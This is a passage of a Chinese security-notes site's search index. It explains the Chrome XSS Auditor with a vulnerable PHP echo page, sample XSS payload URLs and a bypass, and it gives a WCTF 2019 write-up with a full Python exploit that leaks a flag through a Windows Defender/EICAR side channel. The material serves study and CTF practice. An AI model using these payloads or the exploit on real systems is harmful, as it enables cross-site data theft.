\u5c31\u65e0\u80fd\u4e3a\u529b\u4e86\u3002\u4e0d\u8fc7xss auditor\u672c\u8eab\u7684\u667a\u80fd\u5ea6\u4e5f\u633a\u9ad8\uff0c\u50cf\u5b57\u7b26\u7f16\u7801\uff0c\u5927\u5c0f\u5199\u53d8\u5316\u8fd9\u79cd\u53d8\u5316\u4f9d\u7136\u8eb2\u4e0d\u8fc7xss auditor\u3002 \u524d\u7aef\u653b\u9632","title":"XSS"},{"location":"XSS/XSSauditor/#xss","text":"","title":"XSS"},{"location":"XSS/XSSauditor/#_1","text":"\u5047\u8bbe\u6709\u4e00\u4e2a\u641c\u7d22\u9875\u9762\uff0c\u5173\u952e\u5b57\u4ee5Get\u65b9\u6cd5\u4f20\u9012\u3002\u5047\u8bbe\uff0c\u641c\u7d22\u9875\u9762\u5728\u8f93\u51fa\u7ed3\u679c\u65f6\u4f1a\u65e0\u8fc7\u6ee4\u7684\u5c06\u7528\u6237\u7684\u5173\u952e\u5b57\u56de\u663e\u5230\u7f51\u9875\u4e0a\uff0c\u5927\u81f4\u903b\u8f91\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 <?php if ( isset ( $_REQUEST [ \"wd\" ])) $wd = $_REQUEST [ \"wd\" ]; if ( $wd ){ echo \"<div>\u5173\u952e\u5b57' $wd '\u641c\u7d22\u7684\u7ed3\u679c\u5982\u4e0b\uff1a</div>\" ; } ?> \u7136\u540e\u641c\u7d22\u8bf7\u6c42\u7684\u94fe\u63a5\u662f: 1 http://localhost/test/haker/xss.php?wd= < script > alert ( \"xss\" )</ script > \u6216\u8005\u4e3a\u4e86\u9690\u853d\u7f16\u4e00\u4e0b\u7801\uff1a 1 http://localhost/test/haker/xss.php?wd=ddd%3Cscript%3Ealert(%22%22)%3C/script%3E \u5982\u679c\u662f\u5728\u51e0\u5e74\u524d\uff0c\u4f60\u7684\u6d4f\u89c8\u5668\u5927\u81f4\u90fd\u4f1a\u5f39\u51fa\u8fd9\u6837\u4e00\u4e2a\u7a97\u53e3\uff1a \u73b0\u5728\uff1a \u662f\u4e71\u7801\uff1f\u6293\u5305\u5427 \u622a\u7136\u4e0d\u540c\uff1f","title":"\u4e00\u4e2a\u7ecf\u5178\u7684\u4f8b\u5b50"},{"location":"XSS/XSSauditor/#xss-auditor","text":"xss auditor\u662fChrome \u548c Safari\u4e2d\u5185\u5efa\u7684\u4e00\u4e2a\u9632\u5fa1xss\u653b\u51fb\u7684\u529f\u80fd\u6a21\u5757\uff0c\u76f8\u5f53\u4e8e\u4e00\u4e2a\u5ba1\u8ba1\u5668\uff0c\u6709\u9884\u8bbe\u89c4\u5219\uff0c\u4e3b\u8981\u529f\u80fd\u5c31\u662f\u9488\u5bf9\u4e0a\u8ff0\u8fd9\u79cd\u60c5\u51b5\u3002\u6b64\u529f\u80fd\u9ed8\u8ba4\u662f\u5f00\u542f\u7684\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u5173\u95ed\uff0c\u9700\u8981\u5728response header\u4e2d\u663e\u5f0f\u6307\u5b9a\uff1a 1 2 //\u5173\u95ed xss auditor X-XSS-Protection: 0 \u5f53\u7136\uff0c\u66f4\u5f3a\u5927\u7684\u662f\uff0c\u89e6\u53d1\u540e\u8fd8\u53ef\u4ee5\u5c06\u8be6\u60c5\u4e0a\u62a5\uff0c\u4fbf\u4e8e\u5206\u6790\u8ddf\u8e2a\uff1a 1 X-XSS-Protection: 1; report=http://example.com/your_report_URI\u590d\u5236\u4ee3\u7801 \u4e5f\u53ef\u4ee5\u4f7f\u7528block\u6a21\u5f0f\uff1a\u4e00\u65e6\u89e6\u53d1\uff0c\u5f53\u524d\u9875\u9762\u5c31\u4f1a\u7ec8\u6b62\uff0c\u5e76\u540c\u65f6\u5c55\u793a\u4e00\u4e2a\u7a7a\u767d\u9875\u9762\u7ed9\u7528\u6237\uff1a 1 X-XSS-Protection: 1; mode=block\u590d\u5236\u4ee3\u7801 \u5982\u679c\u5c06\u8bf7\u6c42\u6362\u6210post\uff0cxss auditor\u8fd8\u4f1a\u88ab\u89e6\u53d1\u5417\uff1f\u7b54\u6848\u662f\uff1a\u53ef\u4ee5\uff01 XSS Auditor\u7684\u7f3a\u70b9 \u6211\u4eec\u5c06\u540e\u53f0\u903b\u8f91\u6539\u4e00\u4e0b\uff0c\u7ed9\u6bcf\u4e2a\">\"\u540e\u52a0\u4e00\u4e2a\u5206\u53f7\u3002 1 2 3 4 5 6 7 <?php if(isset($_REQUEST[\"wd\"])) $wd=str_replace(\">\",\">;\",$_REQUEST[\"wd\"]); if($wd){ echo \"<div>\u5173\u952e\u5b57'$wd'\u641c\u7d22\u7684\u7ed3\u679c\u5982\u4e0b\uff1a</div>\" } ?>\u590d\u5236\u4ee3\u7801 \u7136\u540e\u4f9d\u7136\u662f\u4e4b\u524d\u7684\u94fe\u63a5\uff0c\u5237\u65b0\uff1a \u6210\u529f\u4e86\uff0c\u5f53\u7136\u672c\u4f8b\u53ea\u662f\u4e00\u4e2a\u8bf4\u660e\uff0c\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u90fd\u4f1a\u5bf9\u7528\u6237\u63d0\u4ea4\u7684\u6570\u636e\u8fdb\u884c\u4e00\u4e9b\u5904\u7406\uff0c\u5982\u679c\u8fd9\u4e9b\u5904\u7406\u5bfc\u81f4\u548c\u63d0\u4ea4\u7684\u5185\u5bb9\u4e0d\u4e00\u6837\u4e86\uff0c\u4f46\u662f\u4ecd\u7136\u53ef\u4ee5\u6267\u884c\uff0c\u6bd4\u5982\u50cf\u672c\u4f8b\u4e00\u6837\u3002\u90a3\u4e48xss auditor \u5c31\u65e0\u80fd\u4e3a\u529b\u4e86\u3002\u4e0d\u8fc7xss auditor\u672c\u8eab\u7684\u667a\u80fd\u5ea6\u4e5f\u633a\u9ad8\uff0c\u50cf\u5b57\u7b26\u7f16\u7801\uff0c\u5927\u5c0f\u5199\u53d8\u5316\u8fd9\u79cd\u53d8\u5316\u4f9d\u7136\u8eb2\u4e0d\u8fc7xss auditor\u3002 \u524d\u7aef\u653b\u9632","title":"XSS Auditor"},{"location":"XSS/\u5229\u7528Windows Defender\u4fa7\u4fe1\u9053\u653b\u51fb/","text":"\u524d\u8a00 \u00b6 \u5728WCTF 2019\u4e0a\uff0cTokyoWesterns\u8bbe\u8ba1\u4e86\u4e00\u9053\u9898\u76ee\uff0c\u5728\u8fd9\u9053\u9898\u76ee\u4e2d\uff0c\u9700\u8981\u5229\u7528Windows Defender\u5b8c\u6210\u4fa7\u4fe1\u9053\u653b\u51fb\uff0c\u672c\u7bc7\u4e3b\u8981\u662f\u5bf9\u8be5\u5229\u7528\u65b9\u5f0f\u8fdb\u884c\u5206\u6790\u3002 \u8be5\u9898\u76ee\u7684\u8d5b\u540e\u5206\u4eab\u6587\u6863\u89c1\u94fe\u63a5\uff1a https://westerns.tokyo/wctf2019-gtf/wctf2019-gtf-slides.pdf Chrome Xss Auditor \u00b6 \u8be5\u9898\u76ee\u4e0e35C3 CTF\u4e0a\u7684FileManager\u7684\u5229\u7528\u601d\u8def\u6bd4\u8f83\u7c7b\u4f3c\uff0c\u90fd\u662f\u901a\u8fc7\u5bf9\u67d0\u79cd\u9632\u5fa1\u673a\u5236\u8fdb\u884c\u4fa7\u4fe1\u9053\u653b\u51fb\uff0c\u4ece\u800c\u83b7\u53d6\u6211\u4eec\u539f\u672c\u65e0\u6743\u83b7\u53d6\u7684\u5185\u5bb9\u3002\u6240\u4ee5\u5148\u6765\u56de\u987e\u4e0b\u8fd9\u4e2a\u9898\u76ee\u7684\u653b\u51fb\u65b9\u6cd5\u3002 \u5728Chrome Xss Audotor\u4e2d\uff0c\u5f53\u68c0\u6d4b\u5230\u8f93\u5165\u4e0e\u8f93\u51fa\u5230\u811a\u672c\u5185\u5bb9\u91cd\u590d\u65f6\uff0c\u4f1a\u5c06\u9875\u9762\u91cd\u5b9a\u5411\u81f3\u5f02\u5e38\u9875\u9762 chrome-error://chromewebdata/ \u3002 \u4ee5\u4e00\u4e2a\u4f8b\u5b50\u8fdb\u884c\u8bf4\u660e\uff1a 1 2 3 4 5 6 7 8 <?php $con = @ $_GET [ \"con\" ]; if ( $con === 'con' ){ echo \"<script>var success='success';</script>\" ; } else { echo \"<script>var fail='fail';</script>\" ; } ?> \u82e5GET\u4f20\u8f93\u7684\u53c2\u6570\u4e3a con=con&<script>var success='success';</script> \uff0cPHP\u7684if\u6d41\u7a0b\u4f1a\u8df3\u8f6c\u81f3\u7b2c\u4e00\u4e2a\u5206\u652f\u4e2d\uff0c\u9875\u9762\u4f1a\u8f93\u51fa\uff1a 1 <script>var success='success';</script> \u8fd9\u4e00\u6bb5\u5185\u5bb9\u4e0e\u6211\u4eecGET\u4f20\u8f93\u7684\u5185\u5bb9\u91cd\u590d\u4e86\uff0c\u6b64\u65f6\u4f1a\u89e6\u53d1XSS Auditor\uff0c\u8fdb\u800c\u8df3\u8f6c\u81f3\u5f02\u5e38\u9875\u9762\u3002\u5982\u679cGET\u4f20\u8f93\u7684\u5185\u5bb9\u662f con=cxxx&<script>var success='success';</script> \uff0c\u5219\u8fdb\u5165\u7b2c\u4e8c\u4e2a\u5206\u652f\uff0c\u9875\u9762\u8f93\u51fa\u7684\u5185\u5bb9\u4e3a\uff1a 1 <script>var fail='fail';</script> \u6b64\u65f6\u9875\u9762\u8f93\u51fa\u4e0eURL\u4e2d\u5185\u5bb9\u4e0d\u91cd\u590d\uff0c\u4e0d\u4f1a\u89e6\u53d1XSS Auditor\u3002\u4ee5\u4e0a\u5c31\u662f\u89e6\u53d1XSS Auditor\u7684\u65b9\u6cd5\u3002 \u90a3\u4e48\u5982\u4f55\u5229\u7528\u5b83\u5462\uff1f \u7531\u4e8e\u8fd9\u4e2a\u9898\u76ee\u4e2d\u5b58\u5728\u901a\u8fc7GET\u4f20\u5165\u7684\u5b57\u7b26\u4e32\u8fdb\u884c\u641c\u7d22\u7684\u529f\u80fd\uff0c\u8fd9\u5c31\u548c\u4e0a\u9762\u4f8b\u5b50\u5f88\u76f8\u4f3c\u4e86\uff0c\u4f20\u5165\u7684\u53c2\u6570\u4f1a\u5f71\u54cd\u9875\u9762\u8f93\u51fa\u7684\u811a\u672c\uff0c\u6211\u4eec\u53ea\u9700\u8981\u4e0d\u65ad\u5730\u4fee\u6539\u641c\u7d22\u7684\u5b57\u7b26\u4e32\uff0c\u4fbf\u80fd\u901a\u8fc7XSS Auditor\u7684\u72b6\u6001\u6765\u5224\u65ad\u9875\u9762\u662f\u5426\u771f\u7684\u5b58\u5728\u8fd9\u4e32\u6587\u672c\u3002 Windows Defender \u00b6 \u5bf9Windows Defender\u7684\u4fa7\u4fe1\u9053\u5229\u7528\u4e5f\u662f\u7c7b\u4f3c\u7684\u601d\u60f3\u3002 \u89e6\u53d1Windows Defender \u00b6 \u9996\u5148\u9700\u8981\u660e\u767d\u7684\u662f\uff0cWindows Defender\u7684\u89e6\u53d1\u673a\u5236\u662f\u600e\u6837\u7684\u3002\u5176\u6d41\u7a0b\u5982\u4e0b\uff1a \u68c0\u67e5\u6587\u4ef6\u5185\u5bb9\u4e2d\u662f\u5426\u5b58\u5728\u6076\u610f\u6570\u636e \u5982\u679c\u5b58\u5728\u6076\u610f\u6570\u636e\uff0c\u62d2\u7edd\u7528\u6237\u8bbf\u95ee \u5c06\u6076\u610f\u6570\u636e\u90e8\u5206\u66ff\u6362\u4e3a\u7a7a\u5b57\u8282 (\u5220\u9664\u6587\u4ef6) \u9996\u5148\u9700\u8981\u627e\u5230\u600e\u6837\u7684\u6076\u610f\u6570\u636e\u80fd\u591f\u89e6\u53d1Windows Defender\uff0c\u8fd9\u91ccEICAR\u6d4b\u8bd5\u6587\u4ef6\u4fbf\u53ef\u4ee5\u505a\u5230\u3002\u6bd4\u5982\u8fd9\u4e00\u6bb5\uff1a 1 X5O!P%@AP[4\\\\\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H* mpengine.dll\u662fWindows Defender\u7684\u6838\u5fc3DLL\uff0c\u5176\u4e2d\u5305\u542b\u4e86JScript engine\uff0c\u5728JScript engine\u4e2d\u7ee7\u627f\u4e86\u4e00\u4e9b\u57fa\u7840\u7528\u6cd5\uff0c\u6bd4\u5982\u5b57\u7b26\u4e32\u7d22\u5f15\u64cd\u4f5c\u3001\u6570\u5b66\u64cd\u4f5c\u8fd9\u4e9b\uff0c\u5e76\u4e14\u652f\u6301eval\u51fd\u6570\uff0c\u4f46\u662feval\u7684\u53c2\u6570\u4f1a\u8fdb\u884c\u68c0\u6d4b\uff0c\u90a3\u4e48\u6b64\u65f6\u6211\u4eec\u4f20\u5165\u4e0b\u5217js\uff0c\u4fbf\u4f1a\u89e6\u53d1Windows Defender\uff1a 1 eval('X5O!P%@AP[4\\\\\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H*') \u6b64\u65f6\u6211\u4eec\u53ef\u4ee5\u6784\u601d\u51fa\u653b\u51fb\u65b9\u5f0f\uff0c\u5c06eval\u4e2d\u7684\u7279\u5f81payload\u5206\u5272\u6210\u4e24\u6bb5\uff0c\u6bd4\u5982\uff1a 1 X5O!P%@AP[4\\\\\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H * \u63a5\u4e0b\u6765\u8981\u601d\u8003\u7684\u5c31\u662f\u5982\u4f55\u5e26\u5165\u8fd9\u4e2a * \u4e86\uff0c\u7531\u4e8e\u9898\u76ee\u4e2d\u6211\u4eec\u7684\u76ee\u6807\u662f\u8981\u83b7\u53d6\u5230 /flag \u4e0b\u7684flag\u5b57\u7b26\u4e32\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u5c06flag\u5b57\u7b26\u4e32\u548c * \u7ed3\u5408\u5728\u4e00\u8d77\u3002\u8fd9\u91cc\u53ef\u4ee5\u8003\u8651\u7528\u6570\u7ec4\u7684\u5f62\u5f0f\uff0c\u6570\u7ec4\u7684\u5f62\u5f0f\u4e3a {c:'*'}[c] \uff0c\u540c\u65f6\u6211\u4eec\u8981\u5c06\u5176\u6539\u5199\u4e3a \u4e0eFlag\u4e2d\u5355\u4e2a\u5b57\u7b26\u76f8\u7b49\u65f6\u8fd4\u56de * \uff0c\u6539\u5199\u7684\u7248\u672c\u4e3a\uff1a 1 {c:'*'}[Math.min(c,n)] n\u4e3a\u83b7\u53d6\u7684Flag\u4e2d\u7684\u67d0\u4e00\u4e2a\u5b57\u7b26\u7ecf\u8fc7charCodeAt\u5904\u7406\u7684\u8fd4\u56de\u503c\uff0c\u800cc\u4e3a\u4e00\u4e2a\u4f1a\u4e0d\u65ad\u53d8\u5316\u7684\u503c\u3002charCodeAt\u7684\u8fd4\u56de\u503c\u8303\u56f4\u57280-65535\uff0c\u56e0\u6b64\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u7528\u4e8c\u5206\u7684\u65b9\u6cd5\u6765\u8868\u793ac\uff1a 1 2 3 4 5 6 7 8 l = 0; h = 0x100; while h - l > 1: m = ( h + l ) // 2; if(\u89e6\u53d1): l = m else: h = m \u63a5\u4e0b\u6765\u9700\u8981\u601d\u8003\u7684\u5c31\u662f\u89e6\u53d1\u6761\u4ef6\u662f\u4ec0\u4e48\u4e86\u3002\u7531\u4e8e\u5728Windows Defener\u8bc6\u522b\u5230\u6076\u610f\u6570\u636e\u65f6\uff0c\u4f1a\u8fd4\u56de500\u7981\u6b62\u8bbf\u95ee\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06500\u7684\u72b6\u6001\u4f5c\u4e3aif\u7684\u5224\u65ad\u6761\u4ef6\u3002 \u6700\u7ec8\u7684exp\u4e3a\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 import requests URL = \"http://192.168.122.78\" # changeme def randstr ( n = 8 ): import random import string chars = string . ascii_uppercase + string . ascii_lowercase + string . digits return '' . join ([ random . choice ( chars ) for _ in range ( n )]) def trigger ( c , idx , sess ): import string prefix = randstr () p = prefix + '''<script>f=function(n){eval('X5O!P%@AP[4 \\\\\\\\ PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{${c}:'*'}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));</script><body>''' p = string . Template ( p ) . substitute ({ 'idx' : idx , 'c' : c }) req = sess . post ( URL + '/gyotaku' , data = { 'url' : 'http://127.0.0.1/flag?a=' + p }) return req . json () def leak ( idx , sess ): l , h = 0 , 0x100 while h - l > 1 : m = ( h + l ) // 2 gid = trigger ( m , idx , sess ) if sess . get ( URL + '/gyotaku/' + gid ) . status_code == 500 : l = m else : h = m return chr ( l ) sess = requests . session () sess . post ( URL + '/login' , data = { 'username' : '</body>' + randstr (), 'password' : randstr ()}) data = '' for i in range ( 30 ): data += leak ( i , sess ) print ( data ) \u53c2\u8003meizijiu\u5e08\u5085\u7684\u6587\u7ae0","title":"\u524d\u8a00"},{"location":"XSS/\u5229\u7528Windows Defender\u4fa7\u4fe1\u9053\u653b\u51fb/#_1","text":"\u5728WCTF 2019\u4e0a\uff0cTokyoWesterns\u8bbe\u8ba1\u4e86\u4e00\u9053\u9898\u76ee\uff0c\u5728\u8fd9\u9053\u9898\u76ee\u4e2d\uff0c\u9700\u8981\u5229\u7528Windows Defender\u5b8c\u6210\u4fa7\u4fe1\u9053\u653b\u51fb\uff0c\u672c\u7bc7\u4e3b\u8981\u662f\u5bf9\u8be5\u5229\u7528\u65b9\u5f0f\u8fdb\u884c\u5206\u6790\u3002 \u8be5\u9898\u76ee\u7684\u8d5b\u540e\u5206\u4eab\u6587\u6863\u89c1\u94fe\u63a5\uff1a https://westerns.tokyo/wctf2019-gtf/wctf2019-gtf-slides.pdf","title":"\u524d\u8a00"},{"location":"XSS/\u5229\u7528Windows Defender\u4fa7\u4fe1\u9053\u653b\u51fb/#chrome-xss-auditor","text":"\u8be5\u9898\u76ee\u4e0e35C3 CTF\u4e0a\u7684FileManager\u7684\u5229\u7528\u601d\u8def\u6bd4\u8f83\u7c7b\u4f3c\uff0c\u90fd\u662f\u901a\u8fc7\u5bf9\u67d0\u79cd\u9632\u5fa1\u673a\u5236\u8fdb\u884c\u4fa7\u4fe1\u9053\u653b\u51fb\uff0c\u4ece\u800c\u83b7\u53d6\u6211\u4eec\u539f\u672c\u65e0\u6743\u83b7\u53d6\u7684\u5185\u5bb9\u3002\u6240\u4ee5\u5148\u6765\u56de\u987e\u4e0b\u8fd9\u4e2a\u9898\u76ee\u7684\u653b\u51fb\u65b9\u6cd5\u3002 \u5728Chrome Xss Audotor\u4e2d\uff0c\u5f53\u68c0\u6d4b\u5230\u8f93\u5165\u4e0e\u8f93\u51fa\u5230\u811a\u672c\u5185\u5bb9\u91cd\u590d\u65f6\uff0c\u4f1a\u5c06\u9875\u9762\u91cd\u5b9a\u5411\u81f3\u5f02\u5e38\u9875\u9762 chrome-error://chromewebdata/ \u3002 \u4ee5\u4e00\u4e2a\u4f8b\u5b50\u8fdb\u884c\u8bf4\u660e\uff1a 1 2 3 4 5 6 7 8 <?php $con = @ $_GET [ \"con\" ]; if ( $con === 'con' ){ echo \"<script>var success='success';</script>\" ; } else { echo \"<script>var fail='fail';</script>\" ; } ?> \u82e5GET\u4f20\u8f93\u7684\u53c2\u6570\u4e3a con=con&<script>var success='success';</script> \uff0cPHP\u7684if\u6d41\u7a0b\u4f1a\u8df3\u8f6c\u81f3\u7b2c\u4e00\u4e2a\u5206\u652f\u4e2d\uff0c\u9875\u9762\u4f1a\u8f93\u51fa\uff1a 1 <script>var success='success';</script> \u8fd9\u4e00\u6bb5\u5185\u5bb9\u4e0e\u6211\u4eecGET\u4f20\u8f93\u7684\u5185\u5bb9\u91cd\u590d\u4e86\uff0c\u6b64\u65f6\u4f1a\u89e6\u53d1XSS Auditor\uff0c\u8fdb\u800c\u8df3\u8f6c\u81f3\u5f02\u5e38\u9875\u9762\u3002\u5982\u679cGET\u4f20\u8f93\u7684\u5185\u5bb9\u662f con=cxxx&<script>var success='success';</script> \uff0c\u5219\u8fdb\u5165\u7b2c\u4e8c\u4e2a\u5206\u652f\uff0c\u9875\u9762\u8f93\u51fa\u7684\u5185\u5bb9\u4e3a\uff1a 1 <script>var fail='fail';</script> \u6b64\u65f6\u9875\u9762\u8f93\u51fa\u4e0eURL\u4e2d\u5185\u5bb9\u4e0d\u91cd\u590d\uff0c\u4e0d\u4f1a\u89e6\u53d1XSS Auditor\u3002\u4ee5\u4e0a\u5c31\u662f\u89e6\u53d1XSS Auditor\u7684\u65b9\u6cd5\u3002 \u90a3\u4e48\u5982\u4f55\u5229\u7528\u5b83\u5462\uff1f \u7531\u4e8e\u8fd9\u4e2a\u9898\u76ee\u4e2d\u5b58\u5728\u901a\u8fc7GET\u4f20\u5165\u7684\u5b57\u7b26\u4e32\u8fdb\u884c\u641c\u7d22\u7684\u529f\u80fd\uff0c\u8fd9\u5c31\u548c\u4e0a\u9762\u4f8b\u5b50\u5f88\u76f8\u4f3c\u4e86\uff0c\u4f20\u5165\u7684\u53c2\u6570\u4f1a\u5f71\u54cd\u9875\u9762\u8f93\u51fa\u7684\u811a\u672c\uff0c\u6211\u4eec\u53ea\u9700\u8981\u4e0d\u65ad\u5730\u4fee\u6539\u641c\u7d22\u7684\u5b57\u7b26\u4e32\uff0c\u4fbf\u80fd\u901a\u8fc7XSS Auditor\u7684\u72b6\u6001\u6765\u5224\u65ad\u9875\u9762\u662f\u5426\u771f\u7684\u5b58\u5728\u8fd9\u4e32\u6587\u672c\u3002","title":"Chrome Xss Auditor"},{"location":"XSS/\u5229\u7528Windows Defender\u4fa7\u4fe1\u9053\u653b\u51fb/#windows-defender","text":"\u5bf9Windows Defender\u7684\u4fa7\u4fe1\u9053\u5229\u7528\u4e5f\u662f\u7c7b\u4f3c\u7684\u601d\u60f3\u3002","title":"Windows Defender"},{"location":"XSS/\u5229\u7528Windows Defender\u4fa7\u4fe1\u9053\u653b\u51fb/#windows-defender_1","text":"\u9996\u5148\u9700\u8981\u660e\u767d\u7684\u662f\uff0cWindows Defender\u7684\u89e6\u53d1\u673a\u5236\u662f\u600e\u6837\u7684\u3002\u5176\u6d41\u7a0b\u5982\u4e0b\uff1a \u68c0\u67e5\u6587\u4ef6\u5185\u5bb9\u4e2d\u662f\u5426\u5b58\u5728\u6076\u610f\u6570\u636e \u5982\u679c\u5b58\u5728\u6076\u610f\u6570\u636e\uff0c\u62d2\u7edd\u7528\u6237\u8bbf\u95ee \u5c06\u6076\u610f\u6570\u636e\u90e8\u5206\u66ff\u6362\u4e3a\u7a7a\u5b57\u8282 (\u5220\u9664\u6587\u4ef6) \u9996\u5148\u9700\u8981\u627e\u5230\u600e\u6837\u7684\u6076\u610f\u6570\u636e\u80fd\u591f\u89e6\u53d1Windows Defender\uff0c\u8fd9\u91ccEICAR\u6d4b\u8bd5\u6587\u4ef6\u4fbf\u53ef\u4ee5\u505a\u5230\u3002\u6bd4\u5982\u8fd9\u4e00\u6bb5\uff1a 1 X5O!P%@AP[4\\\\\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H* mpengine.dll\u662fWindows Defender\u7684\u6838\u5fc3DLL\uff0c\u5176\u4e2d\u5305\u542b\u4e86JScript engine\uff0c\u5728JScript engine\u4e2d\u7ee7\u627f\u4e86\u4e00\u4e9b\u57fa\u7840\u7528\u6cd5\uff0c\u6bd4\u5982\u5b57\u7b26\u4e32\u7d22\u5f15\u64cd\u4f5c\u3001\u6570\u5b66\u64cd\u4f5c\u8fd9\u4e9b\uff0c\u5e76\u4e14\u652f\u6301eval\u51fd\u6570\uff0c\u4f46\u662feval\u7684\u53c2\u6570\u4f1a\u8fdb\u884c\u68c0\u6d4b\uff0c\u90a3\u4e48\u6b64\u65f6\u6211\u4eec\u4f20\u5165\u4e0b\u5217js\uff0c\u4fbf\u4f1a\u89e6\u53d1Windows Defender\uff1a 1 eval('X5O!P%@AP[4\\\\\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H*') \u6b64\u65f6\u6211\u4eec\u53ef\u4ee5\u6784\u601d\u51fa\u653b\u51fb\u65b9\u5f0f\uff0c\u5c06eval\u4e2d\u7684\u7279\u5f81payload\u5206\u5272\u6210\u4e24\u6bb5\uff0c\u6bd4\u5982\uff1a 1 X5O!P%@AP[4\\\\\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H * \u63a5\u4e0b\u6765\u8981\u601d\u8003\u7684\u5c31\u662f\u5982\u4f55\u5e26\u5165\u8fd9\u4e2a * \u4e86\uff0c\u7531\u4e8e\u9898\u76ee\u4e2d\u6211\u4eec\u7684\u76ee\u6807\u662f\u8981\u83b7\u53d6\u5230 /flag \u4e0b\u7684flag\u5b57\u7b26\u4e32\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u5c06flag\u5b57\u7b26\u4e32\u548c * \u7ed3\u5408\u5728\u4e00\u8d77\u3002\u8fd9\u91cc\u53ef\u4ee5\u8003\u8651\u7528\u6570\u7ec4\u7684\u5f62\u5f0f\uff0c\u6570\u7ec4\u7684\u5f62\u5f0f\u4e3a {c:'*'}[c] \uff0c\u540c\u65f6\u6211\u4eec\u8981\u5c06\u5176\u6539\u5199\u4e3a \u4e0eFlag\u4e2d\u5355\u4e2a\u5b57\u7b26\u76f8\u7b49\u65f6\u8fd4\u56de * \uff0c\u6539\u5199\u7684\u7248\u672c\u4e3a\uff1a 1 {c:'*'}[Math.min(c,n)] n\u4e3a\u83b7\u53d6\u7684Flag\u4e2d\u7684\u67d0\u4e00\u4e2a\u5b57\u7b26\u7ecf\u8fc7charCodeAt\u5904\u7406\u7684\u8fd4\u56de\u503c\uff0c\u800cc\u4e3a\u4e00\u4e2a\u4f1a\u4e0d\u65ad\u53d8\u5316\u7684\u503c\u3002charCodeAt\u7684\u8fd4\u56de\u503c\u8303\u56f4\u57280-65535\uff0c\u56e0\u6b64\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u7528\u4e8c\u5206\u7684\u65b9\u6cd5\u6765\u8868\u793ac\uff1a 1 2 3 4 5 6 7 8 l = 0; h = 0x100; while h - l > 1: m = ( h + l ) // 2; if(\u89e6\u53d1): l = m else: h = m \u63a5\u4e0b\u6765\u9700\u8981\u601d\u8003\u7684\u5c31\u662f\u89e6\u53d1\u6761\u4ef6\u662f\u4ec0\u4e48\u4e86\u3002\u7531\u4e8e\u5728Windows Defener\u8bc6\u522b\u5230\u6076\u610f\u6570\u636e\u65f6\uff0c\u4f1a\u8fd4\u56de500\u7981\u6b62\u8bbf\u95ee\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06500\u7684\u72b6\u6001\u4f5c\u4e3aif\u7684\u5224\u65ad\u6761\u4ef6\u3002 \u6700\u7ec8\u7684exp\u4e3a\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 import requests URL = \"http://192.168.122.78\" # changeme def randstr ( n = 8 ): import random import string chars = string . ascii_uppercase + string . ascii_lowercase + string . digits return '' . join ([ random . choice ( chars ) for _ in range ( n )]) def trigger ( c , idx , sess ): import string prefix = randstr () p = prefix + '''<script>f=function(n){eval('X5O!P%@AP[4 \\\\\\\\ PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{${c}:'*'}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));</script><body>''' p = string . Template ( p ) . substitute ({ 'idx' : idx , 'c' : c }) req = sess . post ( URL + '/gyotaku' , data = { 'url' : 'http://127.0.0.1/flag?a=' + p }) return req . json () def leak ( idx , sess ): l , h = 0 , 0x100 while h - l > 1 : m = ( h + l ) // 2 gid = trigger ( m , idx , sess ) if sess . get ( URL + '/gyotaku/' + gid ) . status_code == 500 : l = m else : h = m return chr ( l ) sess = requests . session () sess . post ( URL + '/login' , data = { 'username' : '</body>' + randstr (), 'password' : randstr ()}) data = '' for i in range ( 30 ): data += leak ( i , sess ) print ( data ) \u53c2\u8003meizijiu\u5e08\u5085\u7684\u6587\u7ae0","title":"\u89e6\u53d1Windows Defender"},{"location":"advanAudit/","text":"\u5ba1\u8ba1\u8fdb\u9636 \u00b6","title":"\u5ba1\u8ba1\u8fdb\u9636"},{"location":"advanAudit/#_1","text":"","title":"\u5ba1\u8ba1\u8fdb\u9636"},{"location":"advanAudit/tp5/","text":"thinkphp-RCE\u6f0f\u6d1e\u5206\u6790 \u00b6 \u8fd8\u662f\u4e00\u6708\u4efd\u7684\u6587\u7ae0\u3002\u4e0d\u8fc7\u597d\u597d\u5b66\u4e60 decade\u5e08\u5085\u7684\u6587\u7ae0","title":"thinkphp-RCE\u6f0f\u6d1e\u5206\u6790"},{"location":"advanAudit/tp5/#thinkphp-rce","text":"\u8fd8\u662f\u4e00\u6708\u4efd\u7684\u6587\u7ae0\u3002\u4e0d\u8fc7\u597d\u597d\u5b66\u4e60 decade\u5e08\u5085\u7684\u6587\u7ae0","title":"thinkphp-RCE\u6f0f\u6d1e\u5206\u6790"},{"location":"audit/","text":"\u4ee3\u7801\u5ba1\u8ba1 \u00b6 